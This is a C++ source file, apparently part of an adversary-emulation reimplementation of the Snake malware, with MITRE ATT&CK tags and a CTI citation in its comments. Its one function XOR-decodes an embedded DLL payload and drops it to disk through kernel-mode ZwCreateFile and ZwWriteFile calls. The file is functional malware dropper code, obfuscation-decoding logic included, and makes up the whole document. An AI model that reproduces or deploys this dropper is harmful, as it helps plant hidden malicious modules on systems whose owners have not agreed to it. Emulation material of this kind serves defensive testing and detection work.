#include "filesystem.hpp"
#include "payload.hpp"

void xor_payload(char* buf, size_t size) {
    for (auto i = 0; i < size; i++) {
        buf[i] ^= 0xd3;
    }
}

/*
 * write_file:
 *      About:
 *          XOR-decodes the embedded usermodule DLL and drops it to disk.
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
NTSTATUS write_file() {
    HANDLE file{};
    OBJECT_ATTRIBUTES attrs{};
    IO_STATUS_BLOCK status_block{};

    InitializeObjectAttributes(
        &attrs,
        &PAYLOAD_PATH,
        OBJ_CASE_INSENSITIVE,
        nullptr,
        nullptr
    );

    NTSTATUS status = ::ZwCreateFile(
        &file,
        GENERIC_READ | GENERIC_WRITE,
        &attrs,
        &status_block,
        nullptr,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_SUPERSEDE,
        FILE_SYNCHRONOUS_IO_NONALERT,
        nullptr,
        0
    );
    if (NT_ERROR(status)) {
        return status;
    }

    xor_payload(reinterpret_cast<char*>(DllPayload_dll), DllPayload_dll_len);

    status = ::ZwWriteFile(
        file,
        nullptr,
        nullptr,
        nullptr,
        &status_block,
        DllPayload_dll,
        DllPayload_dll_len,
        nullptr,
        nullptr
    );
    if (NT_ERROR(status)) {
        ::ZwClose(file);
        return status;
    }

    ::ZwClose(file);
    return STATUS_SUCCESS;
}
